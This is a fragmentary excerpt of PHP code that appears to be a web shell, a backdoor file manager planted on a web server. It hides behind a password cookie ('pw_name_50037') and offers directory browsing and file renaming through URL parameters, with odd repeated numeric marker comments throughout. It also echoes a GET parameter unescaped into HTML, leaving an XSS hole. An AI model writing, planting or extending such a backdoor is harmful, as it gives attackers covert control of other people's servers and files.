...
$pass = false;
if (isset($_COOKIE['pw_name_50037'])) {
    if(($_COOKIE['pw_name_50037']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_50037'])) {
        if(($_POST['pw_name_50037']) == $auth_key) {
            setcookie("pw_name_50037", $_POST['pw_name_50037']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_50037' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1721092038443641 1721092038122153 1721092038631805 1721092038518175
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1721092038443641 1721092038122153 1721092038631805 1721092038518175
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1721092038443641 1721092038122153 1721092038631805 1721092038518175
            $name = PATH . "/" . $_GET['r'];
